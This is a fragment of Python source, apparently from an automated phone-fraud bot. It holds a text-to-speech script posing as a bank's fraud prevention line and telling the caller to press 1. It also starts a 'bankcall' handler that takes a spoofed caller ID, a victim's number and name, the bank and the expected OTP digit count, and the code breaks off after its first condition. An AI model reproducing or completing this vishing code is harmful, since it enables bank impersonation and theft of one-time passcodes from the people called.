...
# TTS Payloads
PAYLOAD_START_CALL = "Hello {name}, this is an automated message from the {bank} fraud prevention line. we have sent this automated call because of a login attempt from an unknown device. if this was not you. please press 1."
...
async def bankcall(data: dict, module: str, call_variables: str, event: str, channel_id: str, number: str, spoof: str, bank: str, name: str, otpdigits: str, chatid: str, tag: str):
    if event == "Dial":
